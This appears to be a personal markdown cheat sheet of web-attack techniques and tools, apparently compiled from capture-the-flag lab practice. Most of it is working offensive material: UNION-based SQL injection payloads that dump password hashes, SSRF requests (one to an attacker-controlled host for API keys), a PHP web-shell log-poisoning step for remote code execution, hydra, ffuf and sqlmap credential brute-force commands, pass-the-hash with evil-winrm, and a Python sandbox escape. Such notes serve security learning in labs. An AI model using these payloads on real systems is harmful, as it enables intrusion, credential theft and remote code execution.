admin123' UNION SELECT 1;--
admin123' UNION SELECT 1,2,3;-- 
admin123' UNION SELECT 1,2,3 where database() like '%';--
admin123' UNION SELECT 1,2,3 where database() like 's%';--
admin123' UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema = 'sqli_three' and table_name like 'a%';--
admin123' UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema = 'sqli_three' and table_name='users';--
admin123' UNION SELECT 1,2,3 FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='sqli_three' and TABLE_NAME='users' and COLUMN_NAME like 'a%';
admin123' UNION SELECT 1,2,3 FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='sqli_three' and TABLE_NAME='users' and COLUMN_NAME like 'a%' and COLUMN_NAME !='id';
admin123' UNION SELECT 1,2,3 from users where username like 'a%
admin123' UNION SELECT 1,2,3 from users where username='admin' and password like 'a%
```

Or can use sleep() instead. Ex. `UNION SELECT SLEEP(5),2;--`

### union (practice)

Set if we have four selected fields.

Request;

```sql
http://<IP>/admin?user=0 union select 1,2,3,4 -- -
```

Response;

```html
  <div>
          User 2 <br />
          ID: 1 <br />
          Is administrator: true <br />
       <button onclick="this.disabled = true">Delete user</button>
      </div>
```

Seems the query returns 4 columns in which value of column 1 and 2 are reflected on the output.



Request;

```sql
user=0 union select 1,group_concat(schema_name),3,4 from information_schema.schemata-- -
```

Response;

```sql
information_schema,marketplace
```

we have two tables.



Request;

```sql
user=0 union select 1,group_concat(table_name),3,4 from information_schema.tables where table_schema='marketplace'-- -
```

Response;

```html
<div>
          User items,messages,users <br />
          ID: 1 <br />
          Is administrator: true <br />
       <button onclick="this.disabled = true">Delete user</button>
      </div>
```

There are three tables. ie users,messages and items.



Request;

```sql
/admin?user=0 union select group_concat(column_name,'\n'),2,3,4 from information_schema.columns where table_name='users'-- -
```

Response;

```html
<br />
          ID: id
,username
,password
,isAdministrator
 <br />
```

There are 4 colums: ie id,username,password and isAdministrator. So lets dump all the contents of the users table.



Request;

```sql
/admin?user=0 union select 1,group_concat(id,':',username,':',password,':',isAdministrator,'\n'),3,4 from marketplace.users-- -
```

Response;

```html
 <div>
          User 1:system:$2b$10$83pRYaR/d4ZWJVEex.lxu.Xs1a/TNDBWIUmB4z.R0DT0MSGIGzsgW:0
,2:michael:$2b$10$yaYKN53QQ6ZvPzHGAlmqiOwGt8DXLAO5u2844yUlvu2EXwQDGf/1q:1
,3:jake:$2b$10$/DkSlJB4L85SCNhS.IxcfeNpEBn.VkyLvQ2Tk9p2SDsiVcCRb4ukG:1
,4:a:$2b$10$O9iXKuQ.xG1ckYhmmYDtzeG2V6O1D8gIUHCrg.iDOK4j3Co.Qgy16:0
 <br />
```

password hashes

## SSRF

- Expected req: `http://website.thm/stock?url=http://api.website.thm/api/stock/item?id=123`

  Hacker req: `http://website.thm/stock?url=http://api.website.thm/api/user`

  Web req: `http://api.website.thm/api/user`

- Expected req: `http://website.thm/stock?url=/item?id=123`

  Hacker req: `http://website.thm/stock?url=/../user`

  Web req: `http://api.website.thm/api/stock/../user`

- Expected req: `http://website.thm/stock?server=api&id=123`

  Hacker req: `http://website.thm/stock?server=api.website.thm/api/user&x=&id=123`

  Web req: `http://api.website.thm/api/user?x=.website.thm/api/stock/item?id=123`

- Expected req: `http://website.thm/stock?url=http://api.website.thm/api/stock/item?id=123`

  Hacker req: `http://website.thm/stock?url=http://hackerdomain.thm/`

  Get data like API keys

- Inspect radio buttons and change value to `x/../private` and submit, then inspect again, the value shows the content of /private 

## CSRF

- Burp Suite

  ```
  POST /customers/reset?email=robert%40acmeitsupport.thm HTTP/1.1
  Host: 10.10.165.153
  User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
  Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
  Accept-Language: en-US,en;q=0.5
  Accept-Encoding: gzip, deflate
  Content-Type: application/x-www-form-urlencoded
  Content-Length: 15
  Origin: http://10.10.165.153
  Connection: close
  Referer: http://10.10.165.153/customers/reset?email=robert%40acmeitsupport.thm
  Cookie: admin=false
  Upgrade-Insecure-Requests: 1
  
  username=robert
  ```

  Change `username=robert` to 

  `username=robert&email=steve%40customer.acmeitsupport.thm`

- Curl

  ```bash
  curl 'http://10.10.165.153/customers/reset?email=robert@acmeitsupport.thm' -H 'Content-Type: application/x-www-form-urlencoded' -d 'username=robert&email=steve@customer.acmeitsupport.thm'
  ```

## LFI

If php filter exists: `http://<ip>/?view=php://filter/convert.base64-encode/resource=index`

### FLI2RCE(Log Poisoning)

Burp suit to catch GET request, access to /var/log/apache2/access.log and change user agent to `<?php system($_GET['c']); ?>`

And then, execute commands with url. 

Ex. `?view=../../../../var/log/apache2/cat/../access.log&ext&c=ls`

## RFI

If already complete log poisoning, do `curl http://<ip>:<port>/<file> -o <file>` to download files.



## Tools

### SCP (Secure copy via ssh)

- copy from REMOTE to LOCAL

  ```bash
  scp <user>@<remote_IP>:<path> <local_path>
  ```

- copy from LOCAL to REMOTE

  ```bash
  scp <loacl_path> <user>@<remote_IP>:<path>
  ```




### wfuzz (scan subdomain)

```bash
wfuzz -c -f subdomains.txt -w ../../Tools/wordlists/subdomains-top1million-5000.txt -u "http://cmess.thm/" -H "Host: FUZZ.cmess.thm" --hw 290
```



### Nikto

vulnerability scanner

```bash
nikto -h <ip>
```

fuzzing directory with basic authemtication

```bash
nikto -h <ip> -port <port> -id <user>:<password>
```



### hydra

```bash
hydra -P <wordlist> -v <ip> <protocol>
```

- POST from burpsuite

  ```bash
  hydra -l <username> -P .<password list> $ip  http-form-post '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:loginError'
  ```

- Windows Remote Desktop

  ```bash
  hydra -t 1 -V -f -l <username> -P <wordlist> rdp://<ip>
  ```

- SSH

  ```bash
  hydra -l admin -P ../../Tools/wordlists/rockyou.txt ssh://10.10.20.207
  ```

- Http authentication

  ```bash
  hydra -l <username> -P /usr/share/wordlists/rockyou.txt <IP> -s <port> http-get
  ```

  

### SQLMap

intercept a request with Burpsuite, and save to .txt file. burp suite

```bash
sqlmap -r <file>.txt --dbms=mysql --dump
```

### Evil-WinRM

use hash to gain shell

```bash
evil-winrm -i 10.10.163.204 -u Administrator -H 0e0363213e37b94221497260b0bcb4fc
```



# OSINT

### fuff

- Subdomain

  ```bash
  ffuf -w /usr/share/seclists/Discovery/DNS/namelist.txt -H "Host: FUZZ.acmeitsupport.thm" -u http://10.10.127.35 -fs <size>
  ```

- Username

  ```bash
  ffuf -w /usr/share/seclists/Usernames/Names/names.txt -X POST -d "username=FUZZ&email=x&password=x&cpassword=x" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.10.165.153/customers/signup -mr "username already exists"
  ```

- Passwords

  ```bash
  ffuf -w valid_usernames.txt:W1,/usr/share/wordlists/SecLists/Passwords/Common-Credentials/10-million-password-list-top-100.txt:W2 -X POST -d "username=W1&password=W2" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.10.165.153/customers/login -fc 200
  ```

  

## Files

### binwalk

```bash
binwalk -e <file>
```



### exiftool

```bash
exiftool <file_path>
```

delete all metadata

```bash
exiftool -all= <file_path>
```



### hexedit

edit header hex to repair broken files 

```
hexedit <file>
```

### Steghide

```
steghide info <file>
```

```bash
steghide extract -sf <file>
```



### Wingle.net

search locations with BSSID

# Others

- If IP doesn't work, edit `/etc/hosts`; in windows, `c:\windows\system32\drivers\etc\hosts`

  

## Python

Imported files can be alternative.

Ex. in a.py,

```python
import random
...
```

You can make random.py 

```bash
echo '/bin/bash' > random.py
```



- If some words are restricted, use built-in functions

  ```python
  __builtins__.__dict__['__IMPORT__'.lower()]('OS'.lower()).__dict__['SYSTEM'.lower()]('cat /root/root.txt')
  ```

  

## HTML

- If you wanna overwrite homepage HTML, rewrite index.html and then change DocumentRoot in /etc/apache2/sites-enabled/000-defaulter or /etc/httpd/conf/httpd.conf

- If a website was restricted by firefox, search `about:config` and search for `network.security.ports.banned.override`, then choose `string` and change value to `22`

  

## ROT13

```bash
echo '<word>' | tr 'A-Za-z' 'N-ZA-Mn-za-m'
```

